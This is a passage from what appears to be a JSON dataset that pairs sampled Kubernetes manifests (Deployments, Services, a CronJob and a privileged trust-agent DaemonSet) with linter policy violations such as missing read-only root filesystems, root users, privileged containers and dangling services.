upper}}{{else}}{{.Branch}}{{end}}/{{.Build}}.yaml\n        - -archived-pipelineruns-url-template\n        - gs://logs-tf-jx-classic-wallaby-0aaac4b505b5/jenkins-x/pipelineruns/{{.Namespace}}/{{.Name}}.yaml\n        - -pipeline-trace-url-template\n        - http://grafana-jx-observability.34.69.114.99.nip.io/explore?left=%5B%22now%22,%22now%22,%22Tempo%22,%7B%22query%22:%22{{.TraceID}}%22%7D%5D\n        - -log-level\n        - INFO\n        ports:\n        - name: http\n          containerPort: 8080\n        livenessProbe:\n          tcpSocket:\n            port: http\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: http\n        volumeMounts:\n        - mountPath: /secrets/git\n          name: secrets-git\n        resources:\n          limits:\n            cpu: '1'\n            memory: 512M\n          requests:\n            cpu: '0.2'\n            memory: 128M\n      securityContext:\n        fsGroup: 1000\n      serviceAccountName: jx-pipelines-visualizer\n      volumes:\n      - name: secrets-git\n        secret:\n          defaultMode: 420\n          secretName: tekton-git\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"jx-pipelines-visualizer\" does not have a read-only root file system"
  },
  {
    "id": "7955",
    "manifest_path": "data/manifests/the_stack_sample/sample_2929.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: jx-pipelines-visualizer\n  labels:\n    app.kubernetes.io/name: jx-pipelines-visualizer\n    app.kubernetes.io/instance: jx-pipelines-visualizer\n    helm.sh/chart: jx-pipelines-visualizer-1.7.2\n    app.kubernetes.io/version: 1.7.2\n    app.kubernetes.io/managed-by: Helm\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    meta.helm.sh/release-name: jx-pipelines-visualizer\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: jx-pipelines-visualizer\n      app.kubernetes.io/instance: jx-pipelines-visualizer\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: jx-pipelines-visualizer\n        app.kubernetes.io/instance: jx-pipelines-visualizer\n        helm.sh/chart: jx-pipelines-visualizer-1.7.2\n        app.kubernetes.io/version: 1.7.2\n        app.kubernetes.io/managed-by: Helm\n    spec:\n      containers:\n      - name: jx-pipelines-visualizer\n        image: ghcr.io/jenkins-x/jx-pipelines-visualizer:1.7.2\n        args:\n        - -namespace\n        - jx\n        - -resync-interval\n        - 60s\n        - -archived-logs-url-template\n        - gs://logs-tf-jx-classic-wallaby-0aaac4b505b5/jenkins-x/logs/{{.Owner}}/{{.Repository}}/{{if\n          hasPrefix .Branch \"pr\"}}{{.Branch | upper}}{{else}}{{.Branch}}{{end}}/{{.Build}}.log\n        - -archived-pipelines-url-template\n        - gs://logs-tf-jx-classic-wallaby-0aaac4b505b5/jenkins-x/logs/{{.Owner}}/{{.Repository}}/{{if\n          hasPrefix .Branch \"pr\"}}{{.Branch | upper}}{{else}}{{.Branch}}{{end}}/{{.Build}}.yaml\n        - -archived-pipelineruns-url-template\n        - gs://logs-tf-jx-classic-wallaby-0aaac4b505b5/jenkins-x/pipelineruns/{{.Namespace}}/{{.Name}}.yaml\n        - -pipeline-trace-url-template\n        - http://grafana-jx-observability.34.69.114.99.nip.io/explore?left=%5B%22now%22,%22now%22,%22Tempo%22,%7B%22query%22:%22{{.TraceID}}%22%7D%5D\n        - -log-level\n        - INFO\n        ports:\n        - name: http\n          containerPort: 8080\n        livenessProbe:\n          tcpSocket:\n            port: http\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: http\n        volumeMounts:\n        - mountPath: /secrets/git\n          name: secrets-git\n        resources:\n          limits:\n            cpu: '1'\n            memory: 512M\n          requests:\n            cpu: '0.2'\n            memory: 128M\n      securityContext:\n        fsGroup: 1000\n      serviceAccountName: jx-pipelines-visualizer\n      volumes:\n      - name: secrets-git\n        secret:\n          defaultMode: 420\n          secretName: tekton-git\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"jx-pipelines-visualizer\" not found"
  },
  {
    "id": "7956",
    "manifest_path": "data/manifests/the_stack_sample/sample_2929.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: jx-pipelines-visualizer\n  labels:\n    app.kubernetes.io/name: jx-pipelines-visualizer\n    app.kubernetes.io/instance: jx-pipelines-visualizer\n    helm.sh/chart: jx-pipelines-visualizer-1.7.2\n    app.kubernetes.io/version: 1.7.2\n    app.kubernetes.io/managed-by: Helm\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    meta.helm.sh/release-name: jx-pipelines-visualizer\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: jx-pipelines-visualizer\n      app.kubernetes.io/instance: jx-pipelines-visualizer\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: jx-pipelines-visualizer\n        app.kubernetes.io/instance: jx-pipelines-visualizer\n        helm.sh/chart: jx-pipelines-visualizer-1.7.2\n        app.kubernetes.io/version: 1.7.2\n        app.kubernetes.io/managed-by: Helm\n    spec:\n      containers:\n      - name: jx-pipelines-visualizer\n        image: ghcr.io/jenkins-x/jx-pipelines-visualizer:1.7.2\n        args:\n        - -namespace\n        - jx\n        - -resync-interval\n        - 60s\n        - -archived-logs-url-template\n        - gs://logs-tf-jx-classic-wallaby-0aaac4b505b5/jenkins-x/logs/{{.Owner}}/{{.Repository}}/{{if\n          hasPrefix .Branch \"pr\"}}{{.Branch | upper}}{{else}}{{.Branch}}{{end}}/{{.Build}}.log\n        - -archived-pipelines-url-template\n        - gs://logs-tf-jx-classic-wallaby-0aaac4b505b5/jenkins-x/logs/{{.Owner}}/{{.Repository}}/{{if\n          hasPrefix .Branch \"pr\"}}{{.Branch | upper}}{{else}}{{.Branch}}{{end}}/{{.Build}}.yaml\n        - -archived-pipelineruns-url-template\n        - gs://logs-tf-jx-classic-wallaby-0aaac4b505b5/jenkins-x/pipelineruns/{{.Namespace}}/{{.Name}}.yaml\n        - -pipeline-trace-url-template\n        - http://grafana-jx-observability.34.69.114.99.nip.io/explore?left=%5B%22now%22,%22now%22,%22Tempo%22,%7B%22query%22:%22{{.TraceID}}%22%7D%5D\n        - -log-level\n        - INFO\n        ports:\n        - name: http\n          containerPort: 8080\n        livenessProbe:\n          tcpSocket:\n            port: http\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: http\n        volumeMounts:\n        - mountPath: /secrets/git\n          name: secrets-git\n        resources:\n          limits:\n            cpu: '1'\n            memory: 512M\n          requests:\n            cpu: '0.2'\n            memory: 128M\n      securityContext:\n        fsGroup: 1000\n      serviceAccountName: jx-pipelines-visualizer\n      volumes:\n      - name: secrets-git\n        secret:\n          defaultMode: 420\n          secretName: tekton-git\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"jx-pipelines-visualizer\" is not set to runAsNonRoot"
  },
  {
    "id": "7957",
    "manifest_path": "data/manifests/the_stack_sample/sample_2930.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: folder-cd-trigger\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: trigger\n          env:\n          - name: GIT_REPOSITORY\n            value: github.com/tektoncd/plumbing\n          - name: GIT_REVISION\n            value: main\n          - name: NAMESPACE\n            value: ''\n          - name: CLUSTER_RESOURCE\n            value: robocat-cadmin\n          - name: FOLDER_PATH\n            value: tekton/resources\n          - name: FOLDER_DESCRIPTION\n            value: tekton-resources\n          - name: FOLDER_OVERLAY\n            value: 'true'\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"trigger\" is using an invalid container image, \"\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7958",
    "manifest_path": "data/manifests/the_stack_sample/sample_2930.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: folder-cd-trigger\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: trigger\n          env:\n          - name: GIT_REPOSITORY\n            value: github.com/tektoncd/plumbing\n          - name: GIT_REVISION\n            value: main\n          - name: NAMESPACE\n            value: ''\n          - name: CLUSTER_RESOURCE\n            value: robocat-cadmin\n          - name: FOLDER_PATH\n            value: tekton/resources\n          - name: FOLDER_DESCRIPTION\n            value: tekton-resources\n          - name: FOLDER_OVERLAY\n            value: 'true'\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"trigger\" does not have a read-only root file system"
  },
  {
    "id": "7959",
    "manifest_path": "data/manifests/the_stack_sample/sample_2930.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: folder-cd-trigger\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: trigger\n          env:\n          - name: GIT_REPOSITORY\n            value: github.com/tektoncd/plumbing\n          - name: GIT_REVISION\n            value: main\n          - name: NAMESPACE\n            value: ''\n          - name: CLUSTER_RESOURCE\n            value: robocat-cadmin\n          - name: FOLDER_PATH\n            value: tekton/resources\n          - name: FOLDER_DESCRIPTION\n            value: tekton-resources\n          - name: FOLDER_OVERLAY\n            value: 'true'\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"trigger\" is not set to runAsNonRoot"
  },
  {
    "id": "7960",
    "manifest_path": "data/manifests/the_stack_sample/sample_2930.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: folder-cd-trigger\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: trigger\n          env:\n          - name: GIT_REPOSITORY\n            value: github.com/tektoncd/plumbing\n          - name: GIT_REVISION\n            value: main\n          - name: NAMESPACE\n            value: ''\n          - name: CLUSTER_RESOURCE\n            value: robocat-cadmin\n          - name: FOLDER_PATH\n            value: tekton/resources\n          - name: FOLDER_DESCRIPTION\n            value: tekton-resources\n          - name: FOLDER_OVERLAY\n            value: 'true'\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"trigger\" has cpu request 0"
  },
  {
    "id": "7961",
    "manifest_path": "data/manifests/the_stack_sample/sample_2930.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: folder-cd-trigger\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: trigger\n          env:\n          - name: GIT_REPOSITORY\n            value: github.com/tektoncd/plumbing\n          - name: GIT_REVISION\n            value: main\n          - name: NAMESPACE\n            value: ''\n          - name: CLUSTER_RESOURCE\n            value: robocat-cadmin\n          - name: FOLDER_PATH\n            value: tekton/resources\n          - name: FOLDER_DESCRIPTION\n            value: tekton-resources\n          - name: FOLDER_OVERLAY\n            value: 'true'\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"trigger\" has memory limit 0"
  },
  {
    "id": "7962",
    "manifest_path": "data/manifests/the_stack_sample/sample_2931.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: prometheus-service\n  namespace: monitoring\n  annotations:\n    prometheus.io/scrape: 'true'\n    prometheus.io/port: '9090'\nspec:\n  selector:\n    app: prometheus-server\n  type: NodePort\n  ports:\n  - port: 8080\n    targetPort: 9090\n    nodePort: 30000\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:prometheus-server])"
  },
  {
    "id": "7963",
    "manifest_path": "data/manifests/the_stack_sample/sample_2935.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  annotations:\n    service.beta.openshift.io/serving-cert-secret-name: node-feature-discovery-operator-tls\n  labels:\n    control-plane: controller-manager\n  name: controller-manager-metrics-service\n  namespace: openshift-nfd\nspec:\n  ports:\n  - name: https\n    port: 8443\n    targetPort: https\n  selector:\n    control-plane: controller-manager\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[control-plane:controller-manager])"
  },
  {
    "id": "7964",
    "manifest_path": "data/manifests/the_stack_sample/sample_2937.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: order-service\n  annotations:\n    prometheus.io/scrape: 'true'\nspec:\n  ports:\n  - name: external\n    port: 80\n    targetPort: web\n  selector:\n    app: order-service\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:order-service])"
  },
  {
    "id": "7965",
    "manifest_path": "data/manifests/the_stack_sample/sample_2940.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: webhook-service\n  annotations:\n    service.beta.openshift.io/serving-cert-secret-name: webhook-server-cert\nspec:\n  ports:\n  - port: 443\n    protocol: TCP\n    targetPort: 9443\n  selector:\n    control-plane: controller-manager\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[control-plane:controller-manager])"
  },
  {
    "id": "7966",
    "manifest_path": "data/manifests/the_stack_sample/sample_2941.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: availability-service\n  namespace: default\nspec:\n  type: ClusterIP\n  ports:\n  - port: 80\n    targetPort: 80\n    protocol: TCP\n    name: http\n  selector:\n    app: availability-service\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:availability-service])"
  },
  {
    "id": "7967",
    "manifest_path": "data/manifests/the_stack_sample/sample_2942.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: ta-daemonset-txt\n  namespace: isecl\n  labels:\n    app: ta-txt\nspec:\n  selector:\n    matchLabels:\n      app: ta-txt\n  template:\n    metadata:\n      labels:\n        app: ta-txt\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: node.type\n                operator: In\n                values:\n                - TXT-ENABLED\n      containers:\n      - image: <image-name>:<image-tag>\n        name: ta-txt\n        securityContext:\n          privileged: true\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 1443\n          hostPort: 31443\n        envFrom:\n        - configMapRef:\n            name: ta-config\n        volumeMounts:\n        - name: ta-logs-volume\n          mountPath: /var/log/trustagent/\n        - name: txt-stat\n          mountPath: /usr/sbin/txt-stat\n        - name: ta-config-volume\n          mountPath: /opt/trustagent/configuration\n        - mountPath: /dev/tpmrm0\n          name: tpmrm\n        - mountPath: /etc/hostname\n          name: ta-hostname-path\n          readOnly: true\n        - mountPath: /etc/hosts\n          name: ta-hosts-path\n          readOnly: true\n        - mountPath: /etc/os-release\n          name: ta-host-os-path\n          readOnly: true\n        - mountPath: /dev/mem\n          name: ta-mem-path\n          readOnly: true\n        - mountPath: /sys/firmware/acpi/tables/TPM2\n          name: ta-acpi-path\n          readOnly: true\n        - name: uefi\n          mountPath: /sys/firmware/dmi/tables/DMI\n          readOnly: true\n        - name: wla-config-volume\n          mountPath: /etc/workload-agent/\n        - mountPath: /etc/secrets/\n          name: ta-secrets\n          readOnly: true\n      volumes:\n      - name: ta-logs-volume\n        hostPath:\n          path: /var/log/trustagent\n          type: DirectoryOrCreate\n      - name: ta-config-volume\n        hostPath:\n          path: /opt/trustagent/configuration\n          type: DirectoryOrCreate\n      - name: tpmrm\n        hostPath:\n          path: /dev/tpmrm0\n      - name: txt-stat\n        hostPath:\n          path: /usr/sbin/txt-stat\n      - name: ta-hostname-path\n        hostPath:\n          path: /etc/hostname\n          type: File\n      - name: ta-hosts-path\n        hostPath:\n          path: /etc/hosts\n          type: File\n      - name: ta-host-os-path\n        hostPath:\n          path: /etc/os-release\n          type: File\n      - name: ta-mem-path\n        hostPath:\n          path: /dev/mem\n      - name: ta-acpi-path\n        hostPath:\n          path: /sys/firmware/acpi/tables/TPM2\n      - name: uefi\n        hostPath:\n          path: /sys/firmware/dmi/tables/DMI\n      - name: wla-config-volume\n        hostPath:\n          path: /etc/workload-agent\n          type: DirectoryOrCreate\n      - name: ta-secrets\n        projected:\n          sources:\n          - secret:\n              name: ta-credentials\n          - secret:\n              name: bearer-token\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"ta-txt\" does not have a read-only root file system"
  },
  {
    "id": "7968",
    "manifest_path": "data/manifests/the_stack_sample/sample_2942.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: ta-daemonset-txt\n  namespace: isecl\n  labels:\n    app: ta-txt\nspec:\n  selector:\n    matchLabels:\n      app: ta-txt\n  template:\n    metadata:\n      labels:\n        app: ta-txt\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: node.type\n                operator: In\n                values:\n                - TXT-ENABLED\n      containers:\n      - image: <image-name>:<image-tag>\n        name: ta-txt\n        securityContext:\n          privileged: true\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 1443\n          hostPort: 31443\n        envFrom:\n        - configMapRef:\n            name: ta-config\n        volumeMounts:\n        - name: ta-logs-volume\n          mountPath: /var/log/trustagent/\n        - name: txt-stat\n          mountPath: /usr/sbin/txt-stat\n        - name: ta-config-volume\n          mountPath: /opt/trustagent/configuration\n        - mountPath: /dev/tpmrm0\n          name: tpmrm\n        - mountPath: /etc/hostname\n          name: ta-hostname-path\n          readOnly: true\n        - mountPath: /etc/hosts\n          name: ta-hosts-path\n          readOnly: true\n        - mountPath: /etc/os-release\n          name: ta-host-os-path\n          readOnly: true\n        - mountPath: /dev/mem\n          name: ta-mem-path\n          readOnly: true\n        - mountPath: /sys/firmware/acpi/tables/TPM2\n          name: ta-acpi-path\n          readOnly: true\n        - name: uefi\n          mountPath: /sys/firmware/dmi/tables/DMI\n          readOnly: true\n        - name: wla-config-volume\n          mountPath: /etc/workload-agent/\n        - mountPath: /etc/secrets/\n          name: ta-secrets\n          readOnly: true\n      volumes:\n      - name: ta-logs-volume\n        hostPath:\n          path: /var/log/trustagent\n          type: DirectoryOrCreate\n      - name: ta-config-volume\n        hostPath:\n          path: /opt/trustagent/configuration\n          type: DirectoryOrCreate\n      - name: tpmrm\n        hostPath:\n          path: /dev/tpmrm0\n      - name: txt-stat\n        hostPath:\n          path: /usr/sbin/txt-stat\n      - name: ta-hostname-path\n        hostPath:\n          path: /etc/hostname\n          type: File\n      - name: ta-hosts-path\n        hostPath:\n          path: /etc/hosts\n          type: File\n      - name: ta-host-os-path\n        hostPath:\n          path: /etc/os-release\n          type: File\n      - name: ta-mem-path\n        hostPath:\n          path: /dev/mem\n      - name: ta-acpi-path\n        hostPath:\n          path: /sys/firmware/acpi/tables/TPM2\n      - name: uefi\n        hostPath:\n          path: /sys/firmware/dmi/tables/DMI\n      - name: wla-config-volume\n        hostPath:\n          path: /etc/workload-agent\n          type: DirectoryOrCreate\n      - name: ta-secrets\n        projected:\n          sources:\n          - secret:\n              name: ta-credentials\n          - secret:\n              name: bearer-token\n",
    "policy_id": "privilege-escalation-container",
    "violation_text": "container \"ta-txt\" is Privileged hence allows privilege escalation."
  },
  {
    "id": "7969",
    "manifest_path": "data/manifests/the_stack_sample/sample_2942.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: ta-daemonset-txt\n  namespace: isecl\n  labels:\n    app: ta-txt\nspec:\n  selector:\n    matchLabels:\n      app: ta-txt\n  template:\n    metadata:\n      labels:\n        app: ta-txt\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: node.type\n                operator: In\n                values:\n                - TXT-ENABLED\n      containers:\n      - image: <image-name>:<image-tag>\n        name: ta-txt\n        securityContext:\n          privileged: true\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 1443\n          hostPort: 31443\n        envFrom:\n        - configMapRef:\n            name: ta-config\n        volumeMounts:\n        - name: ta-logs-volume\n          mountPath: /var/log/trustagent/\n        - name: txt-stat\n          mountPath: /usr/sbin/txt-stat\n        - name: ta-config-volume\n          mountPath: /opt/trustagent/configuration\n        - mountPath: /dev/tpmrm0\n          name: tpmrm\n        - mountPath: /etc/hostname\n          name: ta-hostname-path\n          readOnly: true\n        - mountPath: /etc/hosts\n          name: ta-hosts-path\n          readOnly: true\n        - mountPath: /etc/os-release\n          name: ta-host-os-path\n          readOnly: true\n        - mountPath: /dev/mem\n          name: ta-mem-path\n          readOnly: true\n        - mountPath: /sys/firmware/acpi/tables/TPM2\n          name: ta-acpi-path\n          readOnly: true\n        - name: uefi\n          mountPath: /sys/firmware/dmi/tables/DMI\n          readOnly: true\n        - name: wla-config-volume\n          mountPath: /etc/workload-agent/\n        - mountPath: /etc/secrets/\n          name: ta-secrets\n          readOnly: true\n      volumes:\n      - name: ta-logs-volume\n        hostPath:\n          path: /var/log/trustagent\n          type: DirectoryOrCreate\n      - name: ta-config-volume\n        hostPath:\n          path: /opt/trustagent/configuration\n          type: DirectoryOrCreate\n      - name: tpmrm\n        hostPath:\n          path: /dev/tpmrm0\n      - name: txt-stat\n        hostPath:\n          path: /usr/sbin/txt-stat\n      - name: ta-hostname-path\n        hostPath:\n          path: /etc/hostname\n          type: File\n      - name: ta-hosts-path\n        hostPath:\n          path: /etc/hosts\n          type: File\n      - name: ta-host-os-path\n        hostPath:\n          path: /etc/os-release\n          type: File\n      - name: ta-mem-path\n        hostPath:\n          path: /dev/mem\n      - name: ta-acpi-path\n        hostPath:\n          path: /sys/firmware/acpi/tables/TPM2\n      - name: uefi\n        hostPath:\n          path: /sys/firmware/dmi/tables/DMI\n      - name: wla-config-volume\n        hostPath:\n          path: /etc/workload-agent\n          type: DirectoryOrCreate\n      - name: ta-secrets\n        projected:\n          sources:\n          - secret:\n              name: ta-credentials\n          - secret:\n              name: bearer-token\n",
    "policy_id": "privileged-container",
    "violation_text": "container \"ta-txt\" is privileged"
  },
  {
    "id": "7970",
    "manifest_path": "data/manifests/the_stack_sample/sample_2942.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: ta-daemonset-txt\n  namespace: isecl\n  labels:\n    app: ta-txt\nspec:\n  selector:\n    matchLabels:\n      app: ta-txt\n  template:\n    metadata:\n      labels:\n        app: ta-txt\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: node.type\n                operator: In\n                values:\n                - TXT-ENABLED\n      containers:\n      - image: <image-name>:<image-tag>\n        name: ta-txt\n        securityContext:\n          privileged: true\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 1443\n          hostPort: 31443\n        envFrom:\n        - configMapRef:\n            name: ta-config\n        volumeMounts:\n        - name: ta-logs-volume\n          mountPath: /var/log/trustagent/\n        - name: txt-stat\n          mountPath: /usr/sbin/txt-stat\n        - name: ta-config-volume\n          mountPath: /opt/trustagent/configuration\n        - mountPath: /dev/tpmrm0\n          name: tpmrm\n        - mountPath: /etc/hostname\n          name: ta-hostname-path\n          readOnly: true\n        - mountPath: /etc/hosts\n          name: ta-hosts-path\n          readOnly: true\n        - mountPath: /etc/os-release\n          name: ta-host-os-path\n          readOnly: true\n        - mountPath: /dev/mem\n          name: ta-mem-path\n          readOnly: true\n        - mountPath: /sys/firmware/acpi/tables/TPM2\n          name: ta-acpi-path\n          readOnly: true\n        - name: uefi\n          mountPath: /sys/firmware/dmi/tables/DMI\n          readOnly: true\n        - name: wla-config-volume\n          mountPath: /etc/workload-agent/\n        - mountPath: /etc/secrets/\n          name: ta-secrets\n          readOnly: true\n      volumes:\n      - name: ta-logs-volume\n        hostPath:\n          path: /var/log/trustagent\n          type: DirectoryOrCreate\n      - name: ta-config-volume\n        hostPath:\n          path: /opt/trustagent/configuration\n          type: DirectoryOrCreate\n      - name: tpmrm\n        hostPath:\n          path: /dev/tpmrm0\n      - name: txt-stat\n        hostPath:\n          path: /usr/sbin/txt-stat\n      - name: ta-hostname-path\n        hostPath:\n          path: /etc/hostname\n          type: File\n      - name: ta-hosts-path\n        hostPath:\n          path: /etc/hosts\n          type: File\n      - name: ta-host-os-path\n        hostPath:\n          path: /etc/os-release\n          type: File\n      - name: ta-mem-path\n        hostPath:\n          path: /dev/mem\n      - name: ta-acpi-path\n        hostPath:\n          path: /sys/firmware/acpi/tables/TPM2\n      - name: uefi\n        hostPath:\n          path: /sys/firmware/dmi/tables/DMI\n      - name: wla-config-volume\n        hostPath:\n          path: /etc/workload-agent\n          type: DirectoryOrCreate\n      - name: ta-secrets\n        projected:\n          sources:\n          - secret:\n              name: ta-credentials\n          - secret:\n              name: bearer-token\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"ta-txt\" is not set to runAsNonRoot"
  },
  {
    "id": "7971",
    "manifest_path": "data/manifests/the_stack_sample/sample_2942.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: ta-daemonset-txt\n  namespace: isecl\n  labels:\n    app: ta-txt\nspec:\n  selector:\n    matchLabels:\n      app: ta-txt\n  template:\n    metadata:\n      labels:\n        app: ta-txt\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: node.type\n                operator: In\n                values:\n                - TXT-ENABLED\n      containers:\n      - image: <image-name>:<image-tag>\n        name: ta-txt\n        securityContext:\n          privileged: true\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 1443\n          hostPort: 31443\n        envFrom:\n        - configMapRef:\n            name: ta-config\n        volumeMounts:\n        - name: ta-logs-volume\n          mountPath: /var/log/trustagent/\n        - name: txt-stat\n          mountPath: /usr/sbin/txt-stat\n        - name: ta-config-volume\n          mountPath: /opt/trustagent/configuration\n        - mountPath: /dev/tpmrm0\n          name: tpmrm\n        - mountPath: /etc/hostname\n          name: ta-hostname-path\n          readOnly: true\n        - mountPath: /etc/hosts\n          name: ta-hosts-path\n          readOnly: true\n        - mountPath: /etc/os-release\n          name: ta-host-os-path\n          readOnly: true\n        - mountPath: /dev/mem\n          name: ta-mem-path\n          readOnly: true\n        - mountPath: /sys/firmware/acpi/tables/TPM2\n          name: ta-acpi-path\n          readOnly: true\n        - name: uefi\n          mountPath: /sys/firmware/dmi/tables/DMI\n          readOnly: true\n        - name: wla-config-volume\n          mountPath: /etc/workload-agent/\n        - mountPath: /etc/secrets/\n          name: ta-secrets\n          readOnly: true\n      volumes:\n      - name: ta-logs-volume\n        hostPath:\n          path: /var/log/trustagent\n          type: DirectoryOrCreate\n      - name: ta-config-volume\n        hostPath:\n          path: /opt/trustagent/configuration\n          type: DirectoryOrCreate\n      - name: tpmrm\n        hostPath:\n          path: /dev/tpmrm0\n      - name: txt-stat\n        hostPath:\n          path: /usr/sbin/txt-stat\n      - name: ta-hostname-path\n        hostPath:\n          path: /etc/hostname\n          type: File\n      - name: ta-hosts-path\n        hostPath:\n          path: /etc/hosts\n          type: File\n      - name: ta-host-os-path\n        hostPath:\n          path: /etc/os-release\n          type: File\n      - name: ta-mem-path\n        hostPath:\n          path: /dev/mem\n      - name: ta-acpi-path\n        hostPath:\n          path: /sys/firmware/acpi/tables/TPM2\n      - name: uefi\n        hostPath:\n          path: /sys/firmware/dmi/tables/DMI\n      - name: wla-config-volume\n        hostPath:\n          path: /etc/workload-agent\n          type: DirectoryOrCreate\n      - name: ta-secrets\n        projected:\n          sources:\n          - secret:\n              name: ta-credentials\n          - secret:\n              name: bearer-token\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"ta-txt\" has cpu request 0"
  },
  {
    "id": "7972",
    "manifest_path": "data/manifests/the_stack_sample/sample_2942.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: ta-daemonset-txt\n  namespace: isecl\n  labels:\n    app: ta-txt\nspec:\n  selector:\n    matchLabels:\n      app: ta-txt\n  template:\n    metadata:\n      labels:\n        app: ta-txt\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: node.type\n                operator: In\n                values:\n                - TXT-ENABLED\n      containers:\n      - image: <image-name>:<image-tag>\n        name: ta-txt\n        securityContext:\n          privileged: true\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 1443\n          hostPort: 31443\n        envFrom:\n        - configMapRef:\n            name: ta-config\n        volumeMounts:\n        - name: ta-logs-volume\n          mountPath: /var/log/trustagent/\n        - name: txt-stat\n          mountPath: /usr/sbin/txt-stat\n        - name: ta-config-volume\n          mountPath: /opt/trustagent/configuration\n        - mountPath: /dev/tpmrm0\n          name: tpmrm\n        - mountPath: /etc/hostname\n          name: ta-hostname-path\n          readOnly: true\n        - mountPath: /etc/hosts\n          name: ta-hosts-path\n          readOnly: true\n        - mountPath: /etc/os-release\n          name: ta-host-os-path\n          readOnly: true\n        - mountPath: /dev/mem\n          name: ta-mem-path\n          readOnly: true\n        - mountPath: /sys/firmware/acpi/tables/TPM2\n          name: ta-acpi-path\n          readOnly: true\n        - name: uefi\n          mountPath: /sys/firmware/dmi/tables/DMI\n          readOnly: true\n        - name: wla-config-volume\n          mountPath: /etc/workload-agent/\n        - mountPath: /etc/secrets/\n          name: ta-secrets\n          readOnly: true\n      volumes:\n      - name: ta-logs-volume\n        hostPath:\n          path: /var/log/trustagent\n          type: DirectoryOrCreate\n      - name: ta-config-volume\n        hostPath:\n          path: /opt/trustagent/configuration\n          type: DirectoryOrCreate\n      - name: tpmrm\n        hostPath:\n          path: /dev/tpmrm0\n      - name: 